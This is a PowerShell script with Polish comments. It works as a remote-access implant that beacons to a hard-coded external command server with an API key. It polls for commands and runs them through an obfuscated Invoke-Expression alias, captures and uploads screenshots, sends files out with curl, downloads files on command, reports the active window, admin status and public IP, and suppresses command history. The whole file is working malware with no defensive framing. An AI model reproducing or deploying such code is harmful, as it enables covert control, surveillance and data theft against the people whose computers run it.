Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

# ── Konfiguracja ──────────────────────────────────────────────────────────────
$server_url = "https://pmcwar.com/opec/opec"   # <-- zmień
$api_key    = "gY8KsXhami4pk6t9ObW2VZLAJzGToeDRqfQInSuU"         # <-- zmień (ten sam co w config.php)
$session_id = $env:COMPUTERNAME
$Global:ProgressPreference = 'SilentlyContinue'

$headers = @{ "X-API-Key" = $api_key }

# ── Cache IP ──────────────────────────────────────────────────────────────────
$script:cached_ip    = "N/A"
$script:cached_ip_at = [DateTime]::MinValue

function GetPublicIP {
    if (((Get-Date) - $script:cached_ip_at).TotalMinutes -gt 5) {
        try {
            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3
            $script:cached_ip_at = Get-Date
        } catch { }
    }
    return $script:cached_ip
}

# ── WinAPI ────────────────────────────────────────────────────────────────────
Add-Type @"
    using System;
    using System.Text;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
    }
"@ -ErrorAction SilentlyContinue

# ── Funkcje pomocnicze ────────────────────────────────────────────────────────
function CheckAdminRights {
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) { return "Użytkownik '$env:USERNAME' ma uprawnienia administratora" }
    else           { return "Użytkownik '$env:USERNAME' nie ma uprawnień administratora" }
}

function GetActiveWindow {
    try {
        $hwnd = [WinAPI]::GetForegroundWindow()
        $sb   = New-Object System.Text.StringBuilder 256
        [WinAPI]::GetWindowText($hwnd, $sb, 256) | Out-Null
        $pid_out = 0
        [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$pid_out) | Out-Null
        $proc = (Get-Process -Id $pid_out -ErrorAction SilentlyContinue).Name
        return "Proces: $proc`nTytuł:  $($sb.ToString())"
    } catch { return "Błąd: $($_.Exception.Message)" }
}

function UploadFile($filePath) {
    try {
        curl.exe -s -F "file=@$filePath" -F "session_id=$session_id" `
            -H "X-API-Key: $api_key" "$server_url/api.php?action=upload" | Out-Null
    } catch { }
}

function CaptureScreenshot {
    [void][Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $l = [Int32]::MaxValue; $t = [Int32]::MaxValue
    $r = [Int32]::MinValue; $b = [Int32]::MinValue
    foreach ($scr in [Windows.Forms.Screen]::AllScreens) {
        if ($scr.Bounds.X -lt $l)                              { $l = $scr.Bounds.X }
        if ($scr.Bounds.Y -lt $t)                              { $t = $scr.Bounds.Y }
        if ($scr.Bounds.X + $scr.Bounds.Width  -gt $r)        { $r = $scr.Bounds.X + $scr.Bounds.Width }
        if ($scr.Bounds.Y + $scr.Bounds.Height -gt $b)        { $b = $scr.Bounds.Y + $scr.Bounds.Height }
    }
    $bounds = [Drawing.Rectangle]::FromLTRB($l, $t, $r, $b)
    $bmp    = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $gfx    = [Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
    $path = "$env:APPDATA\screenshot.png"
    $bmp.Save($path); $gfx.Dispose(); $bmp.Dispose()
    return $path
}

function SendFile($filePath) {
    if (Test-Path $filePath -PathType Leaf) {
        UploadFile $filePath
        return "Plik przesłany: $filePath"
    }
    return "Plik nie znaleziony: $filePath"
}

function SendScreenshot {
    $path = CaptureScreenshot
    UploadFile $path
    Remove-Item $path -Force
    return "Screenshot przesłany do panelu"
}

# ── Komunikacja z serwerem ────────────────────────────────────────────────────
function SendHeartbeat {
    $body = @{
        session_id = $session_id
        ip         = (GetPublicIP)
        path       = (Get-Location).Path
        user       = $env:USERNAME
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=heartbeat" `
            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
    } catch { }
}

function PollCommand {
    try {
        return Invoke-RestMethod -Uri "$server_url/api.php?action=poll&session_id=$session_id" `
            -Headers $headers -TimeoutSec 10
    } catch { return $null }
}

function SendResult($command_id, $output) {
    $body = @{
        command_id = $command_id
        session_id = $session_id
        output     = $output
        path       = (Get-Location).Path
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=result" `
            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
    } catch { }
}

# ── Obsługa komendy ───────────────────────────────────────────────────────────
function ProcessCommand($obj) {
    $cmd_id = $obj.id
    $type   = $obj.type
    $cmd    = $obj.cmd

    if ($type -eq 'download_url') {
        $url  = $obj.data.url
        $name = $obj.data.file_name
        try {
            Invoke-WebRequest -Uri $url -OutFile $name -TimeoutSec 30 -Headers $headers
            SendResult $cmd_id "Plik pobrany: $name"
        } catch {
            SendResult $cmd_id "Błąd pobierania: $($_.Exception.Message)"
        }
        return
    }

    # Aliasy
    $aliases = @{
        'getip'   = 'GetPublicIP'
        'chadmin' = 'CheckAdminRights'
        'ss'      = 'SendScreenshot'
        'sf'      = 'SendFile'
        'active'  = 'GetActiveWindow'
    }
    $first = ($cmd -split ' ', 2)[0].ToLower()
    if ($aliases.ContainsKey($first)) {
        $rest = if (($cmd -split ' ', 2).Count -gt 1) { ' ' + ($cmd -split ' ', 2)[1] } else { '' }
        $cmd  = $aliases[$first] + $rest
    }

    if ($cmd -eq 'exit') { SendResult $cmd_id "Sesja zakończona"; exit }

    $output = ''
    try {
        $f = ($cmd -split ' ', 2)[0]
        if ($f -eq 'cd' -or $f -eq 'Set-Location') { $cmd = $cmd + ' -ErrorAction Stop; ls' }
        $output = .(Get-Alias ?e[?x])($cmd) | Out-String
    } catch { $output = $Error[0] | Out-String }

    if ([string]::IsNullOrWhiteSpace($output)) { $output = "Polecenie wykonane: $cmd" }

    for ($i = 0; $i -lt $output.Length; $i += 4000) {
        SendResult $cmd_id $output.Substring($i, [Math]::Min(4000, $output.Length - $i))
    }
}

# ── Główna pętla ──────────────────────────────────────────────────────────────
function MainLoop {
    Add-Type -AssemblyName System.Windows.Forms
    $last_hb = [DateTime]::MinValue

    while ($true) {
        if (((Get-Date) - $last_hb).TotalSeconds -gt 30) {
            SendHeartbeat
            $last_hb = Get-Date
        }

        try {
            $obj = PollCommand
            if ($null -ne $obj) {
                ProcessCommand $obj
                # Natychmiast polluj ponownie — może być kolejna komenda
            } else {
                Start-Sleep -Seconds 2
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

MainLoop
